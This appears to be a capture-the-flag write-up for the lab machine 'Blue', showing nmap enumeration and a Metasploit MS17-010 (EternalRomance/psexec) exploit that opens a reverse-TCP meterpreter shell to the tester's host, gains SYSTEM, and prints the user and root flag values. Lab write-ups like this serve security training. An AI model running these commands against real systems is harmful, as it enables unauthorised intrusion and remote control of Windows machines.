## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Blue]
└─$ nmap 10.129.37.165 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-21 16:02 +0545
Nmap scan report for 10.129.37.165
Host is up (0.28s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 25.56 seconds
```

## Enumerating Port 445:

Let's let NMAP do it's thing:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Blue]
└─$ nmap 10.129.37.165 -p445 -sV -sC -T4 --script=vuln         
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-21 16:05 +0545
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.37.165
Host is up (0.34s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.97 seconds
```

Okay so we have some SMB vulnerabilities. Let's try to exploit them.

## Exploiting MS17-010

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Blue]
└─$ msfconsole -q                                                                                                                   
msf6 > search 2017-0143

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.37.165
RHOSTS => 10.129.37.165
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => 10.10.14.17
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.129.37.165:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.129.37.165:445 - Built a write-what-where primitive...
[+] 10.129.37.165:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.37.165:445 - Selecting PowerShell target
[*] 10.129.37.165:445 - Executing the payload...
[+] 10.129.37.165:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.129.37.165
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.129.37.165:49158) at 2023-12-21 16:09:00 +0545

meterpreter > shell
Process 2188 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
C:\Users\haris\Desktop>type user.txt
18a9d2e477161d6db171b24a97f2d293
C:\Users\Administrator\Desktop>type root.txt
5ff3a6cc1568136c911ca02f3e95bde2
```

# Takeaways:
- Always check for SMB vulnerabilities.